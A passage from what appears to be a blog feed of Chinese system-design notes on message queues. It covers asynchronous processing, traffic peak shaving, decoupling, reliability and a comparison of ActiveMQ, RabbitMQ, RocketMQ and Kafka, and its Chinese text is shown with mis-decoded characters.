<li>ç”±äºExchange æä¾›çš„è·¯ç”±ç®—æ³•ï¼ŒAMQPå¯ä»¥æä¾›å¤šæ ·åŒ–çš„è·¯ç”±æ–¹å¼æ¥ä¼ é€’æ¶ˆæ¯åˆ°æ¶ˆæ¯é˜Ÿåˆ—ï¼Œè€Œ JMS ä»…æ”¯æŒ é˜Ÿåˆ— å’Œ ä¸»é¢˜/è®¢é˜… æ–¹å¼ä¸¤ç§ã€‚(AMQPçš„åå››ç§æ¶ˆæ¯æ¨¡å‹å’ŒJMSçš„pub/subæ¨¡å‹æ²¡æœ‰å¤ªå¤§å·®åˆ«ï¼Œä»…æ˜¯åœ¨è·¯ç”±æœºåˆ¶ä¸Šåšäº†æ›´è¯¦ç»†çš„åˆ’åˆ†)</li>
</ul>
<h1 id="äºŒã€æ¶ˆæ¯é˜Ÿåˆ—" tabindex="-1"> äºŒã€æ¶ˆæ¯é˜Ÿåˆ—</h1>
<h2 id="ä»‹ç»" tabindex="-1"> ä»‹ç»</h2>
<p>å¯ä»¥æŠŠæ¶ˆæ¯é˜Ÿåˆ—æ¯”ä½œæ˜¯ä¸€ä¸ªå­˜æ”¾æ¶ˆæ¯çš„å®¹å™¨ï¼Œå½“æˆ‘ä»¬éœ€è¦ä½¿ç”¨æ¶ˆæ¯çš„æ—¶å€™å¯ä»¥å–å‡ºæ¶ˆæ¯ä¾›è‡ªå·±ä½¿ç”¨ã€‚æ¶ˆæ¯é˜Ÿåˆ—æ˜¯åˆ†å¸ƒå¼ç³»ç»Ÿä¸­é‡è¦çš„ç»„ä»¶ï¼Œä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—ä¸»è¦æ˜¯ä¸ºäº†é€šè¿‡å¼‚æ­¥å¤„ç†æé«˜ç³»ç»Ÿæ€§èƒ½å’Œå‰Šå³°ã€é™ä½ç³»ç»Ÿè€¦åˆæ€§ã€‚ç›®å‰ä½¿ç”¨è¾ƒå¤šçš„æ¶ˆæ¯é˜Ÿåˆ—æœ‰ActiveMQï¼ŒRabbitMQï¼ŒKafkaï¼ŒRocketMQç­‰</p>
<h2 id="ä½¿ç”¨åœºæ™¯" tabindex="-1"> ä½¿ç”¨åœºæ™¯</h2>
<h3 id="å¼‚æ­¥å¤„ç†" tabindex="-1"> å¼‚æ­¥å¤„ç†</h3>
<p>å‘é€è€…å°†æ¶ˆæ¯å‘é€ç»™æ¶ˆæ¯é˜Ÿåˆ—ä¹‹åï¼Œä¸éœ€è¦åŒæ­¥ç­‰å¾…æ¶ˆæ¯æ¥æ”¶è€…å¤„ç†å®Œæ¯•ï¼Œè€Œæ˜¯ç«‹å³è¿”å›è¿›è¡Œå…¶å®ƒæ“ä½œã€‚æ¶ˆæ¯æ¥æ”¶è€…ä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­è®¢é˜…æ¶ˆæ¯ä¹‹åå¼‚æ­¥å¤„ç†ã€‚</p>
<p><img src="@source/assets/cs-note/system-design/Asynchronous-message-queue.png" alt="é€šè¿‡å¼‚æ­¥å¤„ç†æé«˜ç³»ç»Ÿæ€§èƒ½" loading="lazy"></p>
<p>å¦‚ä¸Šå›¾ï¼Œåœ¨ä¸ä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—æœåŠ¡å™¨çš„æ—¶å€™ï¼Œç”¨æˆ·çš„è¯·æ±‚æ•°æ®ç›´æ¥å†™å…¥æ•°æ®åº“ï¼Œåœ¨é«˜å¹¶å‘çš„æƒ…å†µä¸‹æ•°æ®åº“å‹åŠ›å‰§å¢ï¼Œä½¿å¾—å“åº”é€Ÿåº¦å˜æ…¢ã€‚ä½†æ˜¯åœ¨ä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—ä¹‹åï¼Œç”¨æˆ·çš„è¯·æ±‚æ•°æ®å‘é€ç»™æ¶ˆæ¯é˜Ÿåˆ—ä¹‹åç«‹å³ è¿”å›ï¼Œå†ç”±æ¶ˆæ¯é˜Ÿåˆ—çš„æ¶ˆè´¹è€…è¿›ç¨‹ä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­è·å–æ•°æ®ï¼Œå¼‚æ­¥å†™å…¥æ•°æ®åº“ã€‚ç”±äºæ¶ˆæ¯é˜Ÿåˆ—æœåŠ¡å™¨å¤„ç†é€Ÿåº¦å¿«äºæ•°æ®åº“ï¼ˆæ¶ˆæ¯é˜Ÿåˆ—ä¹Ÿæ¯”æ•°æ®åº“æœ‰æ›´å¥½çš„ä¼¸ç¼©æ€§ï¼‰ï¼Œå› æ­¤å“åº”é€Ÿåº¦å¾—åˆ°å¤§å¹…æ”¹å–„ã€‚</p>
<p>ä¾‹å¦‚åœ¨æ³¨å†Œæµç¨‹ä¸­é€šå¸¸éœ€è¦å‘é€éªŒè¯é‚®ä»¶æ¥ç¡®ä¿æ³¨å†Œç”¨æˆ·èº«ä»½çš„åˆæ³•æ€§ï¼Œå¯ä»¥ä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—ä½¿å‘é€éªŒè¯é‚®ä»¶çš„æ“ä½œå¼‚æ­¥å¤„ç†ï¼Œç”¨æˆ·åœ¨å¡«å†™å®Œæ³¨å†Œä¿¡æ¯ä¹‹åå°±å¯ä»¥å®Œæˆæ³¨å†Œï¼Œè€Œå°†å‘é€éªŒè¯é‚®ä»¶è¿™ä¸€æ¶ˆæ¯å‘é€åˆ°æ¶ˆæ¯é˜Ÿåˆ—ä¸­ã€‚</p>
<p>åªæœ‰åœ¨ä¸šåŠ¡æµç¨‹å…è®¸å¼‚æ­¥å¤„ç†çš„æƒ…å†µä¸‹æ‰èƒ½è¿™ä¹ˆåšï¼Œä¾‹å¦‚ä¸Šé¢çš„æ³¨å†Œæµç¨‹ä¸­ï¼Œå¦‚æœè¦æ±‚ç”¨æˆ·å¯¹éªŒè¯é‚®ä»¶è¿›è¡Œç‚¹å‡»ä¹‹åæ‰èƒ½å®Œæˆæ³¨å†Œçš„è¯ï¼Œå°±ä¸èƒ½å†ä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—ã€‚</p>
<h3 id="æµé‡å‰Šé”‹" tabindex="-1"> æµé‡å‰Šé”‹</h3>
<p>åœ¨é«˜å¹¶å‘çš„åœºæ™¯ä¸‹ï¼Œå¦‚æœçŸ­æ—¶é—´æœ‰å¤§é‡çš„è¯·æ±‚åˆ°è¾¾ä¼šå‹å®æœåŠ¡å™¨ã€‚</p>
<p>å¯ä»¥å°†è¯·æ±‚å‘é€åˆ°æ¶ˆæ¯é˜Ÿåˆ—ä¸­ï¼ŒæœåŠ¡å™¨æŒ‰ç…§å…¶å¤„ç†èƒ½åŠ›ä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­è®¢é˜…æ¶ˆæ¯è¿›è¡Œå¤„ç†ã€‚</p>
<p><strong>æ¶ˆæ¯é˜Ÿåˆ—å…·æœ‰å¾ˆå¥½çš„å‰Šå³°ä½œç”¨çš„åŠŸèƒ½</strong>ï¼šå³<strong>é€šè¿‡å¼‚æ­¥å¤„ç†ï¼Œå°†çŸ­æ—¶é—´é«˜å¹¶å‘äº§ç”Ÿçš„äº‹åŠ¡æ¶ˆæ¯å­˜å‚¨åœ¨æ¶ˆæ¯é˜Ÿåˆ—ä¸­ï¼Œä»è€Œå‰Šå¹³é«˜å³°æœŸçš„å¹¶å‘äº‹åŠ¡ã€‚</strong> ä¸¾ä¾‹ï¼šåœ¨ç”µå­å•†åŠ¡ä¸€äº›ç§’æ€ã€ä¿ƒé”€æ´»åŠ¨ä¸­ï¼Œåˆç†ä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—å¯ä»¥æœ‰æ•ˆæŠµå¾¡ä¿ƒé”€æ´»åŠ¨åˆšå¼€å§‹å¤§é‡è®¢å•æ¶Œå…¥å¯¹ç³»ç»Ÿçš„å†²å‡»ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="@source/assets/cs-note/system-design/å‰Šå³°-æ¶ˆæ¯é˜Ÿåˆ—.png" alt="åˆç†ä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—å¯ä»¥æœ‰æ•ˆæŠµå¾¡ä¿ƒé”€æ´»åŠ¨åˆšå¼€å§‹å¤§é‡è®¢å•æ¶Œå…¥å¯¹ç³»ç»Ÿçš„å†²å‡»" loading="lazy"></p>
<p>å› ä¸º<strong>ç”¨æˆ·è¯·æ±‚æ•°æ®å†™å…¥æ¶ˆæ¯é˜Ÿåˆ—ä¹‹åå°±ç«‹å³è¿”å›ç»™ç”¨æˆ·äº†ï¼Œä½†æ˜¯è¯·æ±‚æ•°æ®åœ¨åç»­çš„ä¸šåŠ¡æ ¡éªŒã€å†™æ•°æ®åº“ç­‰æ“ä½œä¸­å¯èƒ½å¤±è´¥</strong>ã€‚å› æ­¤ä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—è¿›è¡Œå¼‚æ­¥å¤„ç†ä¹‹åï¼Œéœ€è¦<strong>é€‚å½“ä¿®æ”¹ä¸šåŠ¡æµç¨‹è¿›è¡Œé…åˆ</strong>ï¼Œæ¯”å¦‚<strong>ç”¨æˆ·åœ¨æäº¤è®¢å•ä¹‹åï¼Œè®¢å•æ•°æ®å†™å…¥æ¶ˆæ¯é˜Ÿåˆ—ï¼Œä¸èƒ½ç«‹å³è¿”å›ç”¨æˆ·è®¢å•æäº¤æˆåŠŸï¼Œéœ€è¦åœ¨æ¶ˆæ¯é˜Ÿåˆ—çš„è®¢å•æ¶ˆè´¹è€…è¿›ç¨‹çœŸæ­£å¤„ç†å®Œè¯¥è®¢å•ä¹‹åï¼Œç”šè‡³å‡ºåº“åï¼Œå†é€šè¿‡ç”µå­é‚®ä»¶æˆ–çŸ­ä¿¡é€šçŸ¥ç”¨æˆ·è®¢å•æˆåŠŸ</strong>ï¼Œä»¥å…äº¤æ˜“çº çº·ã€‚è¿™å°±ç±»ä¼¼æˆ‘ä»¬å¹³æ—¶æ‰‹æœºè®¢ç«è½¦ç¥¨å’Œç”µå½±ç¥¨ã€‚</p>
<h3 id="åº”ç”¨è§£è€¦" tabindex="-1"> åº”ç”¨è§£è€¦</h3>
<p>å¦‚æœæ¨¡å—ä¹‹é—´ä¸ç›´æ¥è¿›è¡Œè°ƒç”¨ï¼Œæ¨¡å—ä¹‹é—´è€¦åˆåº¦å°±ä¼šå¾ˆä½ï¼Œé‚£ä¹ˆä¿®æ”¹ä¸€ä¸ªæ¨¡å—æˆ–è€…æ–°å¢ä¸€ä¸ªæ¨¡å—å¯¹å…¶å®ƒæ¨¡å—çš„å½±å“ä¼šå¾ˆå°ï¼Œä»è€Œå®ç°å¯æ‰©å±•æ€§ã€‚</p>
<p>é€šè¿‡ä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—ï¼Œä¸€ä¸ªæ¨¡å—åªéœ€è¦å‘æ¶ˆæ¯é˜Ÿåˆ—ä¸­å‘é€æ¶ˆæ¯ï¼Œå…¶å®ƒæ¨¡å—å¯ä»¥é€‰æ‹©æ€§åœ°ä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­è®¢é˜…æ¶ˆæ¯ä»è€Œå®Œæˆè°ƒç”¨ã€‚</p>
<p>å¸¸è§çš„<strong>äº‹ä»¶é©±åŠ¨æ¶æ„</strong>ç±»ä¼¼ç”Ÿäº§è€…æ¶ˆè´¹è€…æ¨¡å¼ï¼Œåœ¨å¤§å‹ç½‘ç«™ä¸­é€šå¸¸ç”¨åˆ©ç”¨æ¶ˆæ¯é˜Ÿåˆ—å®ç°äº‹ä»¶é©±åŠ¨ç»“æ„ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š
<img src="@source/assets/cs-note/system-design/æ¶ˆæ¯é˜Ÿåˆ—-è§£è€¦.png" alt="åˆ©ç”¨æ¶ˆæ¯é˜Ÿåˆ—å®ç°äº‹ä»¶é©±åŠ¨ç»“æ„" loading="lazy"></p>
<p><strong>æ¶ˆæ¯é˜Ÿåˆ—ä½¿åˆ©ç”¨å‘å¸ƒ-è®¢é˜…æ¨¡å¼å·¥ä½œï¼Œæ¶ˆæ¯å‘é€è€…ï¼ˆç”Ÿäº§è€…ï¼‰å‘å¸ƒæ¶ˆæ¯ï¼Œä¸€ä¸ªæˆ–å¤šä¸ªæ¶ˆæ¯æ¥å—è€…ï¼ˆæ¶ˆè´¹è€…ï¼‰è®¢é˜…æ¶ˆæ¯ã€‚</strong> ä»ä¸Šå›¾å¯ä»¥çœ‹åˆ°<strong>æ¶ˆæ¯å‘é€è€…ï¼ˆç”Ÿäº§è€…ï¼‰å’Œæ¶ˆæ¯æ¥å—è€…ï¼ˆæ¶ˆè´¹è€…ï¼‰ä¹‹é—´æ²¡æœ‰ç›´æ¥è€¦åˆ</strong>ï¼Œæ¶ˆæ¯å‘é€è€…å°†æ¶ˆæ¯å‘é€è‡³åˆ†å¸ƒå¼æ¶ˆæ¯é˜Ÿåˆ—å³ç»“æŸå¯¹æ¶ˆæ¯çš„å¤„ç†ï¼Œæ¶ˆæ¯æ¥å—è€…ä»åˆ†å¸ƒå¼æ¶ˆæ¯é˜Ÿåˆ—è·å–è¯¥æ¶ˆæ¯åè¿›è¡Œåç»­å¤„ç†ï¼Œå¹¶ä¸éœ€è¦çŸ¥é“è¯¥æ¶ˆæ¯ä»ä½•è€Œæ¥ã€‚<strong>å¯¹æ–°å¢ä¸šåŠ¡ï¼Œåªè¦å¯¹è¯¥ç±»æ¶ˆæ¯æ„Ÿå…´è¶£ï¼Œå³å¯è®¢é˜…è¯¥æ¶ˆæ¯ï¼Œå¯¹åŸæœ‰ç³»ç»Ÿå’Œä¸šåŠ¡æ²¡æœ‰ä»»ä½•å½±å“ï¼Œä»è€Œå®ç°ç½‘ç«™ä¸šåŠ¡çš„å¯æ‰©å±•æ€§è®¾è®¡</strong>ã€‚</p>
<p>æ¶ˆæ¯æ¥å—è€…å¯¹æ¶ˆæ¯è¿›è¡Œè¿‡æ»¤ã€å¤„ç†ã€åŒ…è£…åï¼Œæ„é€ æˆä¸€ä¸ªæ–°çš„æ¶ˆæ¯ç±»å‹ï¼Œå°†æ¶ˆæ¯ç»§ç»­å‘é€å‡ºå»ï¼Œç­‰å¾…å…¶ä»–æ¶ˆæ¯æ¥å—è€…è®¢é˜…è¯¥æ¶ˆæ¯ã€‚å› æ­¤åŸºäºäº‹ä»¶ï¼ˆæ¶ˆæ¯å¯¹è±¡ï¼‰é©±åŠ¨çš„ä¸šåŠ¡æ¶æ„å¯ä»¥æ˜¯ä¸€ç³»åˆ—æµç¨‹ã€‚</p>
<p><strong>å¦å¤–ä¸ºäº†é¿å…æ¶ˆæ¯é˜Ÿåˆ—æœåŠ¡å™¨å®•æœºé€ æˆæ¶ˆæ¯ä¸¢å¤±ï¼Œä¼šå°†æˆåŠŸå‘é€åˆ°æ¶ˆæ¯é˜Ÿåˆ—çš„æ¶ˆæ¯å­˜å‚¨åœ¨æ¶ˆæ¯ç”Ÿäº§è€…æœåŠ¡å™¨ä¸Šï¼Œç­‰æ¶ˆæ¯çœŸæ­£è¢«æ¶ˆè´¹è€…æœåŠ¡å™¨å¤„ç†åæ‰åˆ é™¤æ¶ˆæ¯ã€‚åœ¨æ¶ˆæ¯é˜Ÿåˆ—æœåŠ¡å™¨å®•æœºåï¼Œç”Ÿäº§è€…æœåŠ¡å™¨ä¼šé€‰æ‹©åˆ†å¸ƒå¼æ¶ˆæ¯é˜Ÿåˆ—æœåŠ¡å™¨é›†ç¾¤ä¸­çš„å…¶ä»–æœåŠ¡å™¨å‘å¸ƒæ¶ˆæ¯</strong></p>
<p><strong>å¤‡æ³¨ï¼š</strong> ä¸è¦è®¤ä¸ºæ¶ˆæ¯é˜Ÿåˆ—åªèƒ½åˆ©ç”¨å‘å¸ƒ-è®¢é˜…æ¨¡å¼å·¥ä½œï¼Œåªä¸è¿‡åœ¨è§£è€¦è¿™ä¸ªç‰¹å®šä¸šåŠ¡ç¯å¢ƒä¸‹æ˜¯ä½¿ç”¨å‘å¸ƒ-è®¢é˜…æ¨¡å¼çš„ã€‚</p>
<h2 id="æ¶ˆæ¯é˜Ÿåˆ—çš„é—®é¢˜" tabindex="-1"> æ¶ˆæ¯é˜Ÿåˆ—çš„é—®é¢˜</h2>
<ul>
<li><strong>ç³»ç»Ÿå¯ç”¨æ€§é™ä½ï¼š</strong> ç³»ç»Ÿå¯ç”¨æ€§åœ¨æŸç§ç¨‹åº¦ä¸Šé™ä½ï¼Œä¸ºä»€ä¹ˆè¿™æ ·è¯´å‘¢ï¼Ÿåœ¨åŠ å…¥MQä¹‹å‰ï¼Œä½ ä¸ç”¨è€ƒè™‘æ¶ˆæ¯ä¸¢å¤±æˆ–è€…è¯´MQæŒ‚æ‰ç­‰ç­‰çš„æƒ…å†µï¼Œä½†æ˜¯ï¼Œå¼•å…¥MQä¹‹åä½ å°±éœ€è¦å»è€ƒè™‘äº†ï¼</li>
<li><strong>ç³»ç»Ÿå¤æ‚æ€§æé«˜ï¼š</strong> åŠ å…¥MQä¹‹åï¼Œä½ éœ€è¦ä¿è¯æ¶ˆæ¯æ²¡æœ‰è¢«é‡å¤æ¶ˆè´¹ã€å¤„ç†æ¶ˆæ¯ä¸¢å¤±çš„æƒ…å†µã€ä¿è¯æ¶ˆæ¯ä¼ é€’çš„é¡ºåºæ€§ç­‰ç­‰é—®é¢˜ï¼</li>
<li><strong>ä¸€è‡´æ€§é—®é¢˜ï¼š</strong> æˆ‘ä¸Šé¢è®²äº†æ¶ˆæ¯é˜Ÿåˆ—å¯ä»¥å®ç°å¼‚æ­¥ï¼Œæ¶ˆæ¯é˜Ÿåˆ—å¸¦æ¥çš„å¼‚æ­¥ç¡®å®å¯ä»¥æé«˜ç³»ç»Ÿå“åº”é€Ÿåº¦ã€‚ä½†æ˜¯ï¼Œä¸‡ä¸€æ¶ˆæ¯çš„çœŸæ­£æ¶ˆè´¹è€…å¹¶æ²¡æœ‰æ­£ç¡®æ¶ˆè´¹æ¶ˆæ¯æ€ä¹ˆåŠï¼Ÿè¿™æ ·å°±ä¼šå¯¼è‡´æ•°æ®ä¸ä¸€è‡´çš„æƒ…å†µäº†!</li>
</ul>
<h2 id="å¯é æ€§" tabindex="-1"> å¯é æ€§</h2>
<h3 id="å‘é€ç«¯çš„å¯é æ€§" tabindex="-1"> å‘é€ç«¯çš„å¯é æ€§</h3>
<p>å‘é€ç«¯å®Œæˆæ“ä½œåä¸€å®šèƒ½å°†æ¶ˆæ¯æˆåŠŸå‘é€åˆ°æ¶ˆæ¯é˜Ÿåˆ—ä¸­ã€‚</p>
<p>å®ç°æ–¹æ³•ï¼šåœ¨æœ¬åœ°æ•°æ®åº“å»ºä¸€å¼ æ¶ˆæ¯è¡¨ï¼Œå°†æ¶ˆæ¯æ•°æ®ä¸ä¸šåŠ¡æ•°æ®ä¿å­˜åœ¨åŒä¸€æ•°æ®åº“å®ä¾‹é‡Œï¼Œè¿™æ ·å°±å¯ä»¥åˆ©ç”¨æœ¬åœ°æ•°æ®åº“çš„äº‹åŠ¡æœºåˆ¶ã€‚äº‹åŠ¡æäº¤æˆåŠŸåï¼Œå°†æ¶ˆæ¯è¡¨ä¸­çš„æ¶ˆæ¯è½¬ç§»åˆ°æ¶ˆæ¯é˜Ÿåˆ—ä¸­ï¼Œè‹¥è½¬ç§»æ¶ˆæ¯æˆåŠŸåˆ™åˆ é™¤æ¶ˆæ¯è¡¨ä¸­çš„æ•°æ®ï¼Œå¦åˆ™ç»§ç»­é‡ä¼ ã€‚</p>
<h3 id="æ¥æ”¶ç«¯çš„å¯é æ€§" tabindex="-1"> æ¥æ”¶ç«¯çš„å¯é æ€§</h3>
<p>æ¥æ”¶ç«¯èƒ½å¤Ÿä»æ¶ˆæ¯é˜Ÿåˆ—æˆåŠŸæ¶ˆè´¹ä¸€æ¬¡æ¶ˆæ¯ã€‚</p>
<p>ä¸¤ç§å®ç°æ–¹æ³•ï¼š</p>
<ul>
<li>ä¿è¯æ¥æ”¶ç«¯å¤„ç†æ¶ˆæ¯çš„ä¸šåŠ¡é€»è¾‘å…·æœ‰å¹‚ç­‰æ€§ï¼šåªè¦å…·æœ‰å¹‚ç­‰æ€§ï¼Œé‚£ä¹ˆæ¶ˆè´¹å¤šå°‘æ¬¡æ¶ˆæ¯ï¼Œæœ€åå¤„ç†çš„ç»“æœéƒ½æ˜¯ä¸€æ ·çš„ã€‚</li>
<li>ä¿è¯æ¶ˆæ¯å…·æœ‰å”¯ä¸€ç¼–å·ï¼Œå¹¶ä½¿ç”¨ä¸€å¼ æ—¥å¿—è¡¨æ¥è®°å½•å·²ç»æ¶ˆè´¹çš„æ¶ˆæ¯ç¼–å·ã€‚</li>
</ul>
<h2 id="å¸¸è§æ¶ˆæ¯é˜Ÿåˆ—å¯¹æ¯”" tabindex="-1"> å¸¸è§æ¶ˆæ¯é˜Ÿåˆ—å¯¹æ¯”</h2>
<table>
<thead>
<tr>
<th>å¯¹æ¯”æ–¹å‘</th>
<th>å†…å®¹</th>
</tr>
</thead>
<tbody>
<tr>
<td>ååé‡</td>
<td>ä¸‡çº§çš„ ActiveMQ å’Œ RabbitMQ çš„ååé‡ï¼ˆActiveMQ çš„æ€§èƒ½æœ€å·®ï¼‰è¦æ¯” åä¸‡çº§ç”šè‡³æ˜¯ç™¾ä¸‡çº§çš„ RocketMQ å’Œ Kafka ä½ä¸€ä¸ªæ•°é‡çº§ã€‚</td>
</tr>
<tr>
<td>å¯ç”¨æ€§</td>
<td>éƒ½å¯ä»¥å®ç°é«˜å¯ç”¨ã€‚ActiveMQ å’Œ RabbitMQ éƒ½æ˜¯åŸºäºä¸»ä»æ¶æ„å®ç°é«˜å¯ç”¨æ€§ã€‚RocketMQ åŸºäºåˆ†å¸ƒå¼æ¶æ„ã€‚ kafka ä¹Ÿæ˜¯åˆ†å¸ƒå¼çš„ï¼Œä¸€ä¸ªæ•°æ®å¤šä¸ªå‰¯æœ¬ï¼Œå°‘æ•°æœºå™¨å®•æœºï¼Œä¸ä¼šä¸¢å¤±æ•°æ®ï¼Œä¸ä¼šå¯¼è‡´ä¸å¯ç”¨</td>
</tr>
<tr>
<td>æ—¶æ•ˆæ€§</td>
<td>RabbitMQ åŸºäºerlangå¼€å‘ï¼Œæ‰€ä»¥å¹¶å‘èƒ½åŠ›å¾ˆå¼ºï¼Œæ€§èƒ½æå…¶å¥½ï¼Œå»¶æ—¶å¾ˆä½ï¼Œè¾¾åˆ°å¾®ç§’çº§ã€‚å…¶ä»–ä¸‰ä¸ªéƒ½æ˜¯ ms çº§ã€‚</td>
</tr>
<tr>
<td>åŠŸèƒ½æ”¯æŒ</td>
<td>é™¤äº† Kafkaï¼Œå…¶ä»–ä¸‰ä¸ªåŠŸèƒ½éƒ½è¾ƒä¸ºå®Œå¤‡ã€‚ Kafka åŠŸèƒ½è¾ƒä¸ºç®€å•ï¼Œä¸»è¦æ”¯æŒç®€å•çš„MQåŠŸèƒ½ï¼Œåœ¨å¤§æ•°æ®é¢†åŸŸçš„å®æ—¶è®¡ç®—ä»¥åŠæ—¥å¿—é‡‡é›†è¢«å¤§è§„æ¨¡ä½¿ç”¨ï¼Œæ˜¯äº‹å®ä¸Šçš„æ ‡å‡†</td>
</tr>
<tr>
<td>æ¶ˆæ¯ä¸¢å¤±</td>
<td>ActiveMQ å’Œ RabbitMQ ä¸¢å¤±çš„å¯èƒ½æ€§éå¸¸ä½ï¼Œ RocketMQ å’Œ Kafka ç†è®ºä¸Šä¸ä¼šä¸¢å¤±ã€‚</td>
</tr>
</tbody>
</table>
<p><strong>æ€»ç»“ï¼š</strong></p>
<ul>
<li>ActiveMQ çš„ç¤¾åŒºç®—æ˜¯æ¯”è¾ƒæˆç†Ÿï¼Œä½†æ˜¯è¾ƒç›®å‰æ¥è¯´ï¼ŒActiveMQ çš„æ€§èƒ½æ¯”è¾ƒå·®ï¼Œè€Œä¸”ç‰ˆæœ¬è¿­ä»£å¾ˆæ…¢ï¼Œä¸æ¨èä½¿ç”¨ã€‚</li>
<li>RabbitMQ åœ¨ååé‡æ–¹é¢è™½ç„¶ç¨é€Šäº Kafka å’Œ RocketMQ ï¼Œä½†æ˜¯ç”±äºå®ƒåŸºäº erlang å¼€å‘ï¼Œæ‰€ä»¥å¹¶å‘èƒ½åŠ›å¾ˆå¼ºï¼Œæ€§èƒ½æå…¶å¥½ï¼Œå»¶æ—¶å¾ˆä½ï¼Œè¾¾åˆ°å¾®ç§’çº§ã€‚ä½†æ˜¯ä¹Ÿå› ä¸º RabbitMQ åŸºäº erlang å¼€å‘ï¼Œæ‰€ä»¥å›½å†…å¾ˆå°‘æœ‰å…¬å¸æœ‰å®åŠ›åšerlangæºç çº§åˆ«çš„ç ”ç©¶å’Œå®šåˆ¶ã€‚å¦‚æœä¸šåŠ¡åœºæ™¯å¯¹å¹¶å‘é‡è¦æ±‚ä¸æ˜¯å¤ªé«˜ï¼ˆåä¸‡çº§ã€ç™¾ä¸‡çº§ï¼‰ï¼Œé‚£è¿™å››ç§æ¶ˆæ¯é˜Ÿåˆ—ä¸­ï¼ŒRabbitMQ ä¸€å®šæ˜¯ä½ çš„é¦–é€‰ã€‚å¦‚æœæ˜¯å¤§æ•°æ®é¢†åŸŸçš„å®æ—¶è®¡ç®—ã€æ—¥å¿—é‡‡é›†ç­‰åœºæ™¯ï¼Œç”¨ Kafka æ˜¯ä¸šå†…æ ‡å‡†çš„ï¼Œç»å¯¹æ²¡é—®é¢˜ï¼Œç¤¾åŒºæ´»è·ƒåº¦å¾ˆé«˜ï¼Œç»å¯¹ä¸ä¼šé»„ï¼Œä½•å†µå‡ ä¹æ˜¯å…¨ä¸–ç•Œè¿™ä¸ªé¢†åŸŸçš„äº‹å®æ€§è§„èŒƒã€‚</li>
<li>RocketMQ é˜¿é‡Œå‡ºå“ï¼ŒJava ç³»å¼€æºé¡¹ç›®ï¼Œæºä»£ç æˆ‘ä»¬å¯ä»¥ç›´æ¥é˜…è¯»ï¼Œç„¶åå¯ä»¥å®šåˆ¶è‡ªå·±å…¬å¸çš„MQï¼Œå¹¶ä¸” RocketMQ æœ‰é˜¿é‡Œå·´å·´çš„å®é™…ä¸šåŠ¡åœºæ™¯çš„å®æˆ˜è€ƒéªŒã€‚RocketMQ ç¤¾åŒºæ´»è·ƒåº¦ç›¸å¯¹è¾ƒä¸ºä¸€èˆ¬ï¼Œä¸è¿‡ä¹Ÿè¿˜å¯ä»¥ï¼Œæ–‡æ¡£ç›¸å¯¹æ¥è¯´ç®€å•ä¸€äº›ï¼Œç„¶åæ¥å£è¿™å—ä¸æ˜¯æŒ‰ç…§æ ‡å‡† JMS è§„èŒƒèµ°çš„æœ‰äº›ç³»ç»Ÿè¦è¿ç§»éœ€è¦ä¿®æ”¹å¤§é‡ä»£ç ã€‚è¿˜æœ‰å°±æ˜¯é˜¿é‡Œå‡ºå°çš„æŠ€æœ¯ï¼Œä½ å¾—åšå¥½è¿™ä¸ªæŠ€æœ¯ä¸‡ä¸€è¢«æŠ›å¼ƒï¼Œç¤¾åŒºé»„æ‰çš„é£é™©ï¼Œé‚£å¦‚æœä½ ä»¬å…¬å¸æœ‰æŠ€æœ¯å®åŠ›æˆ‘è§‰å¾—ç”¨RocketMQ æŒºå¥½çš„</li>
<li>kafka çš„ç‰¹ç‚¹å…¶å®å¾ˆæ˜æ˜¾ï¼Œå°±æ˜¯ä»…ä»…æä¾›è¾ƒå°‘çš„æ ¸å¿ƒåŠŸèƒ½ï¼Œä½†æ˜¯æä¾›è¶…é«˜çš„ååé‡ï¼Œms çº§çš„å»¶è¿Ÿï¼Œæé«˜çš„å¯ç”¨æ€§ä»¥åŠå¯é æ€§ï¼Œè€Œä¸”åˆ†å¸ƒå¼å¯ä»¥ä»»æ„æ‰©å±•ã€‚åŒæ—¶ kafka æœ€å¥½æ˜¯æ”¯æ’‘è¾ƒå°‘çš„ topic æ•°é‡å³å¯ï¼Œä¿è¯å…¶è¶…é«˜ååé‡ã€‚kafka å”¯ä¸€çš„ä¸€ç‚¹åŠ£åŠ¿æ˜¯æœ‰å¯èƒ½æ¶ˆæ¯é‡å¤æ¶ˆè´¹ï¼Œé‚£ä¹ˆå¯¹æ•°æ®å‡†ç¡®æ€§ä¼šé€ æˆæå…¶è½»å¾®çš„å½±å“ï¼Œåœ¨å¤§æ•°æ®é¢†åŸŸä¸­ä»¥åŠæ—¥å¿—é‡‡é›†ä¸­ï¼Œè¿™ç‚¹è½»å¾®å½±å“å¯ä»¥å¿½ç•¥è¿™ä¸ªç‰¹æ€§å¤©ç„¶é€‚åˆå¤§æ•°æ®å®æ—¶è®¡ç®—ä»¥åŠæ—¥å¿—æ”¶é›†ã€‚</li>
</ul>
<h1 id="å‚è€ƒèµ„æ–™" tabindex="-1"> å‚è€ƒèµ„æ–™</h1>
<ul>
<li><a href="http://developers-club.com/posts/270339/" target="_blank" rel="noopener noreferrer">Observer vs Pub-Sub</a></li>
<li><a href="https://blog.csdn.net/lizhitao/article/details/47723105" target="_blank" rel="noopener noreferrer">æ¶ˆæ¯é˜Ÿåˆ—ä¸­ç‚¹å¯¹ç‚¹ä¸å‘å¸ƒè®¢é˜…åŒºåˆ«</a></li>
</ul>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">ä¸€ã€æ€§èƒ½</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%9F%BA%E7%A1%80.html</id>
